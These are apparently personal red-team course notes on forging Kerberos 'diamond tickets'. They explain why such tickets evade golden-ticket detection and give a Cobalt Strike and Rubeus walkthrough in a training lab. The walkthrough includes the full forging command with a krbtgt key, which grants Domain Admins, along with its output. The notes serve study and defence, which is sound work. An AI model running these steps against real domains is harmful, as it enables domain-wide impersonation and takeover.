
Domain controllers don't track TGTs it (or they) have legitimately issued, they will happily accept TGTs that are encrypted with its own krbtgt hash.

A possible tactic to detect the use of golden tickets is to look for TGS-REQs that have no corresponding AS-REQ. (why is this TGT not linked to any TGS? detection !!)

Diamond tickets are created from the necessity of evading detection on the usage of [[Golden Tickets]]. 

A "diamond ticket" is made by modifying the fields of a legitimate TGT that was issued by a DC.

#### 🖊️ How it works

We request a legitimate TGT, decrypt it with the domain's krbtgt hash, modify the desired fields of the ticket, then re-encrypt it.  This overcomes the aforementioned shortcoming of a golden ticket because any TGS-REQs will have a preceding AS-REQ.


#### 📔 forge via Cobalt Strike

1) First, we prove we have no access to the DC.

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> ls \\dc-2.dev.cyberbotic.io\c$
[-] could not open \\dc-2.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED
```

2) Diamond tickets can be created with Rubeus.

`beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1106 /groups:512 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap`

where:

- `/tgtdeleg` uses the Kerberos GSS-API to obtain a useable TGT for the current user without needing to know their password, NTLM/AES hash, or elevation on the host.
- `/ticketuser` is the u sername of the user to impersonate.
- `/ticketuserid` is the domain RID of that user.
- `/groups` are the desired group RIDs (512 being Domain Admins).
- `/krbkey` is the krbtgt AES256 hash.

Output will look like this:

```
[*] Action: Diamond Ticket

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/dc-2.dev.cyberbotic.io'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: +mzV4aOvQx3/dpZGBaVEhccq1t+jhKi8oeCYXkjHXw4=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIFgz [...snip...] MuSU8=

[*] Decrypting TGT
[*] Retreiving PAC
[*] Modifying PAC
[*] Signing PAC
[*] Encrypting Modified TGT

[*] base64(ticket.kirbi):

      doIFYj [...snip...] MuSU8=
```


3) Rubeus `describe` will now show that this is a TGT for the target user.

```
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFYj[...snip...]MuSU8=

[*] Action: Describe Ticket

  ServiceName              :  krbtgt/DEV.CYBERBOTIC.IO
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  nlamb
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  7/7/2022 8:41:46 AM
  EndTime                  :  7/7/2022 6:41:46 PM
  RenewTill                :  1/1/1970 12:00:00 AM
  Flags                    :  name_canonicalize, pre_authent, forwarded, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  jp4k3G5LvXpIl3cuAnTtgLuxOWkPJIUjOEZB5wrHdVw=
```



####  📗 C


#### ⚠ Opsec




### Properties
---
📆 created   {{25-02-2024}} 14:11
🏷️ tags: #redteam #crto 

---

